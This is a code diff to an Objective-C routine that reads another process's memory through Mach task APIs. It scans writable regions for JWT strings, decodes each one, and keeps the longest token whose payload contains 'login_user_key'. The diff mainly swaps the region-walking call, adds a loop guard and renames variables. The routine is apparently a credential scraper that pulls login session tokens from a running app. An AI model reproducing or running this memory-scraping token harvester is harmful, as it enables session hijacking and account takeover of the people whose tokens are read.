@@ -149,15 +149,16 @@ static BOOL SLIsB64Char(unsigned char c) {
     vm_address_t addr = 0;
     NSString *best = nil;
     NSUInteger scanned = 0;
-    while (scanned < (512u << 20)) {
+    int guard = 0;
+    while (scanned < (256u << 20) && guard++ < 30000) {
         vm_size_t size = 0;
-        natural_t depth = 0;
-        struct vm_region_submap_info_64 info;
-        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
-        kern_return_t kr = vm_region_recurse_64(task, &addr, &size, &depth,
-                                                (vm_region_info_64_t)&info, &cnt);
+        struct vm_region_basic_info_64 info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj = MACH_PORT_NULL;
+        kern_return_t kr = vm_region_64(task, &addr, &size, VM_REGION_BASIC_INFO_64,
+                                        (vm_region_info_64_t)&info, &cnt, &obj);
         if (kr != KERN_SUCCESS || !size) break;
-        if (info.is_submap) { depth++; continue; }
+        if (info.is_submap) { addr += size; continue; }
         if ((info.protection & VM_PROT_WRITE) && size > 1000 && size <= (64u << 20)) {
             char *buf = malloc(size);
             if (buf) {
@@ -165,32 +166,33 @@ static BOOL SLIsB64Char(unsigned char c) {
                 if (vm_read_overwrite(task, addr, size, (vm_address_t)buf, &out) == KERN_SUCCESS) {
                     scanned += size;
                     NSUInteger n = out;
-                    for (NSUInteger i = 0; i + 3 < n; i++) {
-                        if (!(buf[i] == 'e' && buf[i+1] == 'y' && buf[i+2] == 'J')) continue;
-                        NSUInteger j = i;
-                        while (j < n && (SLIsB64Char((unsigned char)buf[j]) || buf[j] == '.')) j++;
-                        NSUInteger len = j - i;
-                        if (len < 100 || len > 4000) { continue; }
+                    for (NSUInteger k2 = 0; k2 + 3 < n; k2++) {
+                        if (!(buf[k2] == 'e' && buf[k2+1] == 'y' && buf[k2+2] == 'J')) continue;
+                        NSUInteger j2 = k2;
+                        while (j2 < n && (SLIsB64Char((unsigned char)buf[j2]) || buf[j2] == '.')) j2++;
+                        NSUInteger len2 = j2 - k2;
+                        if (len2 < 100 || len2 > 4000) continue;
                         int dots = 0;
                         NSUInteger d1 = 0, d2 = 0;
-                        for (NSUInteger k = i; k < j; k++) {
-                            if (buf[k] == '.') { if (!dots) d1 = k; else d2 = k; dots++; }
+                        for (NSUInteger q = k2; q < j2; q++) {
+                            if (buf[q] == '.') { if (!dots) d1 = q; else d2 = q; dots++; }
                         }
                         if (dots != 2 || !d2) continue;
                         NSString *payload = [[NSString alloc] initWithBytes:buf + d1 + 1
                                                                      length:d2 - d1 - 1
                                                                    encoding:NSUTF8StringEncoding];
                         if (!payload.length) continue;
+                        NSUInteger pl = payload.length;
                         NSData *pd = [[NSData alloc] initWithBase64EncodedString:
-                                      [payload stringByPaddingToLength:((payload.length + 3) / 4) * 4
+                                      [payload stringByPaddingToLength:((pl + 3) / 4) * 4
                                                             withString:@"=" startingAtIndex:0]
                                                                         options:0];
-                        if (!pd) continue;
-                        NSString *pj = [[NSString alloc] initWithData:pd encoding:NSUTF8StringEncoding];
+                        NSString *pj = pd ? [[NSString alloc] initWithData:pd encoding:NSUTF8StringEncoding] : nil;
                         if (![pj containsString:@"login_user_key"]) continue;
-                        NSString *tok = [[NSString alloc] initWithBytes:buf + i length:len encoding:NSUTF8StringEncoding];
+                        NSString *tok = [[NSString alloc] initWithBytes:buf + k2 length:len2
+                                                               encoding:NSUTF8StringEncoding];
                         if (tok.length && (!best.length || tok.length > best.length)) best = tok;
-                        i = j;
+                        k2 = j2;
                     }
                 }
                 free(buf);
